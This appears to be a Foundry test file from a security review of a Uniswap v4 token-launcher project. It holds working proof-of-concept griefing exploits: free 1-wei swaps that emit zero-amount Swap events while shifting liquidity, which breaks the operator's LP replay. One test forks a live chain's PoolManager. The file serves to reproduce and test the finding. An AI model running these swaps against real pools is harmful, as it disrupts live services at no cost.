// SPDX-License-Identifier: MIT
pragma solidity ^0.8.37;

import {Vm} from "forge-std/Vm.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {FullMath} from "@uniswap/v4-core/src/libraries/FullMath.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IHookrRouter} from "../../src/interfaces/IHookrRouter.sol";
import {IHookrLauncher} from "../../src/interfaces/IHookrLauncher.sol";
import {HookrToken} from "../../src/support/HookrToken.sol";
import {ServiceEventExport} from "../utils/ServiceEventExport.sol";

/// @notice G-07 (phase-one review, Appendix A, an unverified lead proposed at Medium), chain half. A swap that runs
///         through an empty gap onto an initialized tick at its price limit (enter), or off the boundary tick of a
///         range it sits on into an empty gap (exit), consumes nothing: the PoolManager emits Swap with both amounts
///         zero while the active liquidity changes. The operator service's LP replay (its
///         zero-amount branch) asserts that a zero-amount Swap never touches active liquidity, so a pool that saw
///         one can no longer be replayed for any window ending after it.
/// @dev Both shapes are the opening state of a subject-only launch: a one-sided range that starts past the opening
///      price (the app's seed plan, `startsPastPrice`) leaves a gap (enter), and a range that starts on the opening
///      tick sits on its boundary (exit). The attacker holds no tokens and no ETH, sets no approval and uses v4's
///      PoolSwapTest as the generic caller; the HookrRouter cannot make the swap (it requires an output). Each test
///      exports the history in the service's fixture shape as `G07_VECTOR_<NAME>`; the service half replays it.
abstract contract ZeroDeltaCrossingBase is ServiceEventExport {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    uint128 internal constant LIQUIDITY = 1e24;
    address internal attacker = address(0xBAD);

    bytes32 internal family;
    PoolKey internal key;
    HookrToken internal subject;
    bool internal native;
    int24 internal lower;
    int24 internal upper;
    uint256 internal launchedAt;
    uint256 internal attackedAt;

    // ------------------------------------------------------------------------------------------------ helpers

    /// @dev One family member over [lower_, upper_] at the opening price 1 (tick 0), funded on the subject side only.
    function _launchShape(bool native_, int24 lower_, int24 upper_, bool guarded) internal {
        native = native_;
        lower = lower_;
        upper = upper_;
        Currency quote;
        if (native_) {
            subject = tokenA;
            quote = Currency.wrap(address(0));
        } else {
            // The subject sorts first, so a range above the opening price holds the subject only.
            bool aFirst = address(tokenA) < address(tokenB);
            subject = aFirst ? tokenA : tokenB;
            quote = Currency.wrap(aFirst ? address(tokenB) : address(tokenA));
        }
        IHookrLauncher.Member[] memory members = new IHookrLauncher.Member[](1);
        members[0] = _member(quote);
        members[0].tickLower = lower_;
        members[0].tickUpper = upper_;
        members[0].liquidity = LIQUIDITY;
        bool subjectFirst = Currency.unwrap(quote) > address(subject);
        members[0].amount0Max = subjectFirst ? 1e24 : 0;
        members[0].amount1Max = subjectFirst ? 0 : 1e24;
        if (guarded) {
            members[0].rules.guardEndBlock = uint40(vm.getBlockNumber() + 10_000);
            members[0].rules.maxBuyQuoteAmount = 1e21;
        }
        _begin();
        launchedAt = vm.getBlockTimestamp();
        (family,) = launcher.launch(
            IHookrLauncher.Token(address(subject), "", "", 0, bytes32(0)),
            address(root),
            members,
            vm.getBlockTimestamp()
        );
        key = launcher.position(family, 0).key;
        _capture(address(this));
    }

    /// @dev The attacker's free swap: 1 wei exact input through v4's PoolSwapTest with empty hookData. Asserts the
    ///      PoolManager's Swap event carries zero amounts, the pool ends at `limit` with `tick` and `liquidity`, and
    ///      the attacker, the PoolManager's balances and the Rules liabilities moved nothing.
    function _zeroSwap(bool zeroForOne, uint160 limit, int24 tick, uint128 liquidity) internal {
        PoolSwapTest swapper = new PoolSwapTest(manager);
        PoolId id = key.toId();
        Currency quote = root.poolConfig(id).quote;
        uint256 managerBalance0 = key.currency0.balanceOf(address(manager));
        uint256 managerBalance1 = key.currency1.balanceOf(address(manager));
        uint256 liabilities = rules.totalLiability(quote);
        _begin();
        if (attackedAt == 0) attackedAt = vm.getBlockTimestamp();
        vm.prank(attacker, attacker);
        swapper.swap(key, SwapParams(zeroForOne, -1, limit), PoolSwapTest.TestSettings(false, false), "");
        Vm.Log[] memory logs = vm.getRecordedLogs();
        uint256 swaps;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(manager) || logs[i].topics[0] != IPoolManager.Swap.selector) continue;
            ++swaps;
            assertEq(logs[i].topics[1], PoolId.unwrap(id), "Swap names the pool");
            assertEq(logs[i].topics[2], bytes32(uint256(uint160(address(swapper)))), "Swap names the caller");
            (int128 amount0, int128 amount1, uint160 price, uint128 active, int24 tickAfter,) =
                abi.decode(logs[i].data, (int128, int128, uint160, uint128, int24, uint24));
            assertEq(amount0, 0, "Swap amount0 is zero");
            assertEq(amount1, 0, "Swap amount1 is zero");
            assertEq(price, limit, "Swap ends at the limit");
            assertEq(active, liquidity, "Swap reports the new active liquidity");
            assertEq(tickAfter, tick, "Swap reports the new tick");
        }
        assertEq(swaps, 1, "one PoolManager Swap");
        _record(logs, attacker);
        (uint160 sqrtPrice, int24 current,,) = manager.getSlot0(id);
        assertEq(sqrtPrice, limit, "the pool ends at the limit");
        assertEq(current, tick, "the pool's tick");
        assertEq(manager.getLiquidity(id), liquidity, "the pool's active liquidity");
        assertEq(attacker.balance, 0, "attacker spent no ETH");
        assertEq(subject.balanceOf(attacker), 0, "attacker received no subject");
        assertEq(key.currency0.balanceOf(address(manager)), managerBalance0, "nothing settled in currency0");
        assertEq(key.currency1.balanceOf(address(manager)), managerBalance1, "nothing settled in currency1");
        assertEq(rules.totalLiability(quote), liabilities, "no Rules claim credited");
    }

    /// @dev `_capture` for logs this test already read: appends them in the service's fixture shape.
    function _record(Vm.Log[] memory logs, address origin) internal {
        for (uint256 i; i < logs.length; ++i) {
            string memory topics;
            for (uint256 j; j < logs[i].topics.length; ++j) {
                topics = string.concat(topics, j == 0 ? "" : ",", '"', vm.toString(logs[i].topics[j]), '"');
            }
            eventsJson = string.concat(
                eventsJson,
                bytes(eventsJson).length == 0 ? "" : ",",
                '{"address":"',
                vm.toString(logs[i].emitter),
                '","topics":[',
                topics,
                '],"data":"',
                vm.toString(logs[i].data),
                '","step":',
                vm.toString(step),
                ',"index":',
                vm.toString(i),
                ',"from":"',
                vm.toString(origin),
                '","contractBlock":"',
                vm.toString(block.number),
                '","timestamp":',
                vm.toString(vm.getBlockTimestamp()),
                "}"
            );
        }
    }

    /// @dev Ordinary app trading that earns the family position fees: buys and a sell on the launch day, then the
    ///      same on the next day, all through the HookrRouter.
    function _ordinaryHistory() internal {
        _routerTrade(true, 1e20);
        _routerTrade(true, 3e20);
        _routerTrade(false, 1e20);
        _nextDay();
        _routerTrade(true, 2e20);
        _routerTrade(false, 5e19);
    }

    function _routerTrade(bool buy, uint128 amount) internal {
        _begin();
        IHookrRouter.Swap memory p = _swap(key, buy, true, amount);
        bool nativeIn = buy && native;
        vm.prank(trader, trader);
        router.swap{value: nativeIn ? amount : 0}(p, address(0), new uint256[](0));
        _capture(trader);
    }

    function _nextDay() internal {
        vm.warp(vm.getBlockTimestamp() + 1 days);
        vm.roll(vm.getBlockNumber() + 7200);
    }

    function _export() internal returns (string memory) {
        int24[] memory ticks = new int24[](2);
        ticks[0] = lower;
        ticks[1] = upper;
        bytes32[] memory positions = new bytes32[](1);
        positions[0] = _familyPosition(family, lower, upper);
        _exportPool(key, ticks, positions);
        return _vector(
            string.concat(
                '"familyId":"',
                vm.toString(family),
                '","poolId":"',
                vm.toString(PoolId.unwrap(key.toId())),
                '","owner":"',
                vm.toString(address(this)),
                '","tLaunch":',
                vm.toString(launchedAt),
                ',"tAttack":',
                vm.toString(attackedAt),
                ","
            )
        );
    }
}

/// @notice G-07 on a local PoolManager: the two opening shapes, their controls and the free repeat.
contract HookrLauncherZeroDeltaCrossingReplayExportTest is ZeroDeltaCrossingBase {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    function setUp() public {
        _setUpPeriphery();
    }

    /// @dev Enter: a native-quoted family whose subject-only range [-60,000, -600] sits below the opening tick 0,
    ///      with the Anti-Snipe guard and its buy cap on. A free 1-wei buy limited to tick -600's price crosses into
    ///      the range: Swap(0, 0) with the liquidity going from 0 to 1e24.
    function testEnterFromTheOpeningGap() public {
        _launchShape(true, -60_000, -600, true);
        PoolId id = key.toId();
        assertEq(manager.getLiquidity(id), 0, "the pool opens with no active liquidity");
        uint160 limit = TickMath.getSqrtPriceAtTick(-600);
        _zeroSwap(true, limit, -601, LIQUIDITY);
        assertLt(vm.getBlockNumber(), rules.config(id).guardEndBlock, "the Anti-Snipe guard was active");
        _ordinaryHistory();
        emit log_named_string("G07_VECTOR_ENTER", _export());
    }

    /// @dev Control for enter: the same launch and the same ordinary trading without the zero-amount swap.
    function testEnterControl() public {
        _launchShape(true, -60_000, -600, true);
        _ordinaryHistory();
        emit log_named_string("G07_VECTOR_ENTER_CONTROL", _export());
    }

    /// @dev Exit: an ERC-20-quoted family whose subject-only range [0, 60,000] starts on the opening tick 0. A free
    ///      1-wei sell with a far limit leaves the range: Swap(0, 0) with the liquidity going from 1e24 to 0.
    function testExitFromTheRangeEdge() public {
        _launchShape(false, 0, 60_000, false);
        PoolId id = key.toId();
        assertEq(manager.getLiquidity(id), LIQUIDITY, "the pool opens on its range's lower tick, liquidity active");
        // The subject is currency0, so a sell is zeroForOne.
        uint160 limit = TickMath.getSqrtPriceAtTick(-6_000);
        _zeroSwap(true, limit, -6_000, 0);
        _ordinaryHistory();
        emit log_named_string("G07_VECTOR_EXIT", _export());
    }

    /// @dev Control for exit: the same launch and the same ordinary trading without the zero-amount swap.
    function testExitControl() public {
        _launchShape(false, 0, 60_000, false);
        _ordinaryHistory();
        emit log_named_string("G07_VECTOR_EXIT_CONTROL", _export());
    }

    /// @dev The grief repeats for free: enter, exit back into the gap, enter again, all at zero cost.
    function testRepeatsAtNoCost() public {
        _launchShape(true, -60_000, -600, true);
        uint160 edge = TickMath.getSqrtPriceAtTick(-600);
        for (uint256 i; i < 3; ++i) {
            _zeroSwap(true, edge, -601, LIQUIDITY);
            _zeroSwap(false, TickMath.getSqrtPriceAtTick(-300), -300, 0);
        }
        assertEq(attacker.balance, 0, "attacker never held or spent ETH");
        assertEq(subject.balanceOf(attacker), 0, "attacker never held or spent the subject");
    }
}

/// @notice G-07 on a Robinhood Chain 4663 fork against the live PoolManager, on the live coordinator's launch shape
///         (LauncherDevBuyFork, the release's live-launch gas table): a new token against ETH opening exactly
///         on the upper tick 198,060 of its [198,060 - 207,000, 198,060] band, so no liquidity is active at open. Two
///         free swaps break the LP replay: one moves the price up into the empty space above the band, the next comes
///         back down onto the band's upper tick at its limit and crosses into the band. Skipped unless ALCHEMY_RPC_URL
///         is set.
contract HookrLauncherZeroDeltaCrossingReplayExportForkTest is ZeroDeltaCrossingBase {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    IPoolManager internal constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    /// @dev foundry.toml's fork_block_number.
    uint256 internal constant FORK_BLOCK = 74_062_645;
    int24 internal constant OPEN_TICK = 198_060;
    uint256 internal constant FORK_SUPPLY = 1e27;
    bool internal live;

    function setUp() public {
        if (bytes(vm.envOr("ALCHEMY_RPC_URL", string(""))).length == 0) return;
        vm.createSelectFork("robinhood", FORK_BLOCK);
        _deployPeriphery(PM);
        live = true;
    }

    /// @dev The release's registry delay.
    function _registryDelay() internal pure override returns (uint48) {
        return 30 minutes;
    }

    function test_fork_liveLaunchShapeBreaksTheReplayForFree() public {
        if (!live) return;
        native = true;
        lower = OPEN_TICK - 207_000;
        upper = OPEN_TICK;
        IHookrLauncher.Member[] memory members = new IHookrLauncher.Member[](1);
        members[0] = _member(Currency.wrap(address(0)));
        uint160 sL = TickMath.getSqrtPriceAtTick(lower);
        uint160 sU = TickMath.getSqrtPriceAtTick(upper);
        members[0].sqrtPriceX96 = sU;
        members[0].tickLower = lower;
        members[0].tickUpper = upper;
        members[0].liquidity = uint128(FullMath.mulDiv(FORK_SUPPLY, 1 << 96, sU - sL) * 999 / 1000);
        members[0].amount0Max = 0;
        members[0].amount1Max = uint128(FORK_SUPPLY);
        _begin();
        launchedAt = vm.getBlockTimestamp();
        (family,) = launcher.launch(
            IHookrLauncher.Token(address(0), "Fork G07", "FG07", FORK_SUPPLY, bytes32("g07")),
            address(root),
            members,
            vm.getBlockTimestamp()
        );
        key = launcher.position(family, 0).key;
        _capture(address(this));
        subject = HookrToken(Currency.unwrap(key.currency1));
        vm.prank(trader);
        subject.approve(address(router), type(uint256).max);
        PoolId id = key.toId();
        (, int24 opened,,) = manager.getSlot0(id);
        assertEq(opened, OPEN_TICK, "opens on the band's upper tick");
        assertEq(manager.getLiquidity(id), 0, "no liquidity active at open");

        // Free move up into the empty space above the band (the replay handles this one), then free entry.
        _zeroSwap(false, TickMath.getSqrtPriceAtTick(OPEN_TICK + 600), OPEN_TICK + 600, 0);
        attackedAt = 0;
        _zeroSwap(true, sU, OPEN_TICK - 1, members[0].liquidity);
        _ordinaryHistory();
        emit log_named_string("G07_VECTOR_LIVE_SHAPE", _export());
    }
}
